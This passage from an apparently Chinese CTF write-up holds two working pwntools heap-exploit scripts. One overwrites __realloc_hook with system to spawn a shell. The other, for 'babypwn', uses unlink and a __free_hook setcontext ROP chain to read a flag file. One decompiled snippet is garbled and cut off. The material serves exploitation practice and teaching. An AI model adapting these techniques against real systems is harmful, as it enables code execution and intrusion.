            gdb.attach(io)
    def ad():
        sla('>>', '1')
    def md(idx, of, sz):
        sla('>>', '2')
        sla(':', str(idx))
        sla(':', str(of))
        sla(':', str(sz))
    def rm(idx):
        sla('>>', '3')
        sla(':', str(idx))
    def ap(idx, sz, d):
        sla('>>', '4')
        sla(':', str(idx))
        sla(':', str(sz))
        sa(':', d)
    def dp(idx):
        sla('>>', '5')
        sla(':', str(idx))
    #--------------------------exploit--------------------------    def exploit():
        li('exploit...')
        # leak libc
        ad()
        md(0, 0, 0x458)
        ad()
        md(0, 0, 0) # free
        md(0, 0, 0x458) # add
        dp(0)
        leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
        libc_base = leak - libc.sym['__malloc_hook'] - 96 - 0x10
        li('libc_base: ' + hex(libc_base))
        # leak heap
        md(0, 0, 0) # free
        md(0, 0, 0x18) # add
        md(1, 0, 0x18) # add
        #ap(0, -1, 'A')
        ap(0, 0x18, b'A' * 0x10 + p64(0x1234))
        md(0, 0, 0)  # free
        md(1, 0, 0)  # free
        md(0, 0, 0x18)  # add
        dp(0)
        ru('data: ')
        leak = u64(ru('\n').ljust(8, b'\x00'))
        heap = leak
        li('heap: ' + hex(heap))
        ad()
        md(1, 0x18, 0)  # add 1
        md(2, 0x18, 0)  # add 2
        ad()
        md(3, 0x18, 0)  # add 3
        md(2, 0, 0)  # free 2
        md(3, 0, 0)  # free 3
        md(1, 0, 0)  # free 1
        li('target_chunk: ' + hex(heap + 0x460))
        p = b'\x00' * 0x18
        p += p64(0x21) + p64(heap + 0x460) + p64(0)
        p += b'\n'
        ap(0, -0x7ffff00, p)
        md(3, 0, 0x18)  # add 3
        md(2, 0, 0x18)  # add 2
        p = p64(libc_base + libc.sym['__realloc_hook']) + p64(0x0000001800000000)
        p += b'\n'
        ap(2, 0x18, p)
        ap(1, 0x18, p64(libc_base + libc.sym['system']) + b'\n')
        ap(0, 0x18, '/bin/sh\x00\n')
        md(0, 0, 0)  # free , to get shell
    def finish():
        ia()
        c()
    #--------------------------main-----------------------------    if __name__ == '__main__':
        if LOCAL:
            elf = ELF(elf_path)
            if LIBC:
                libc = ELF(libc_path)
            io = elf.process()
        else:
            elf = ELF(elf_path)
            io = remote(host.split(':')[0], int(host.split(':')[1]))
            if LIBC:
                libc = ELF(libc_path)
        exploit()
        finish()
###  babypwn
这个题也是个坑，打印函数采用加密
    int __fastcall enc_print(unsigned int a1)
    {
      int i; // [rsp+1Ch] [rbp-4h]
      for ( i = 2; i > 0; --i )
        a1 ^= (32 * a1) ^ ((a1 ^ (32 * a1)) >> 17) ^ (((32 * a1) ^ a1 ^ ((a1 ^ (32 * a1)) >> 17)) >', '1')
        sla(':', str(sz))
    def rm(idx):
        sla('>>', '2')
        sla(':', str(idx))
    def md(idx, d):
        sla('>>', '3')
        sla(':', str(idx))
        sa(':', d)
    def dp(idx):
        sla('>>', '4')
        sla(':', str(idx))
    #--------------------------exploit--------------------------    def exploit():
        li('exploit...')
        ad(0x108) # 0
        ad(0x128) # 1
        ad(0x118) # 2
        ad(0x108) # 3
        for i in range(7):
            ad(0x100)
        for i in range(4, 11):
            rm(i)
        for i in range(7):
            ad(0xf0)
        for i in range(4, 11):
            rm(i)
        rm(0) # set libc
        md(2, 'A' * 0x118) # set last one
        md(2, b'A' * 0x110 + p64(0x120 + 0x130 + 0x110))
        md(3, b'A' * 0xf8 + p64(0x121)) # set fake size
        rm(3) # unlink
        ad(0x108) # 0
        ad(0x108) # 3
        ad(0x108) # 4
        ad(0x108) # 5
        ad(0x108) # 7
        ad(0x108) # 8
        ad(0x108) # 9
        rm(2) # remove chunk1
        ad(0xd0) # 2
        ad(0x150) # 9
        ad(0x130) # 10
        #2760
        md(10, '\x50\x97') # set to stdout
        ad(0x118) # 11
        ad(0x118) # 12
        p = b'A' * 0x10
        p += p64(0xfbad3c80) + p64(0) * 3 + p8(0)
        md(12, p)
        leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
        libc_base = leak - (0x7ffff7b8a8b0 - 0x7ffff779d000)
        li('libc_base: ' + hex(libc_base))
        rm(11)
        md(10, p64(libc_base + libc.sym['__free_hook'] - 0x110))
        ad(0x130) # 11
        ad(0x130) # 13
        libc_open = libc_base + libc.sym['open']
        libc_read = libc_base + libc.sym['read']
        libc_write = libc_base + libc.sym['write']
        pop_rdx_rsi = libc_base + 0x00000000001306d9 # pop rdx ; pop rsi ; ret
        pop_rdi = libc_base + 0x000000000002155f # pop rdi ; ret
        ret = libc_base + 0x00000000000008aa # ret
        pop_rax = libc_base + 0x00000000000439c8 # pop rax ; ret
        syscall = libc_base + 0x11007f
        '''
        p = p64(libc_base + 0x520a5) # setcontext
        p += p64(pop_rdi) + p64(libc_base + libc.sym['__free_hook'] + 0x120)
        p += p64(pop_rdx_rsi) + p64(0) + p64(0)
        p += p64(libc_open)
        p += p64(pop_rdi) + p64(3)
        p += p64(pop_rdx_rsi) + p64(0x100) + p64(libc_base + libc.sym['__malloc_hook'])
        p += p64(libc_read)
        p += p64(pop_rdi) + p64(1)
        p += p64(libc_write)
        p = p.ljust(0x120, b'\x00')
        p += b'./flag'
        '''
        p = p64(pop_rdi) + p64(libc_base + libc.sym['__free_hook'] - 0x10) # flag
        p += p64(pop_rdx_rsi) + p64(0) + p64(0)
        p += p64(pop_rax) + p64(2)
        p += p64(syscall)
        p += p64(pop_rdi) + p64(3)
        p += p64(pop_rdx_rsi) + p64(0x100) + p64(libc_base + libc.sym['__malloc_hook'])
        p += p64(pop_rax) + p64(0)
        p += p64(syscall)
        p += p64(pop_rdi) + p64(1)
        p += p64(pop_rax) + p64(1)
        p += p64(syscall)
        p = p.ljust(0x100, b'\x00')
        p += b'./flag.txt\x00'.ljust(0x10, b'\x00')
        p += p64(libc_base + 0x520a5) # setcontext
        md(13, p) # modify free_hook
        p = b'A' * 0xa0
        p += p64(libc_base + libc.sym['__free_hook'] - 0x110) # rsp
        p += p64(ret) # rcx
        md(11, p)
        db()
        rm(11)
    def finish():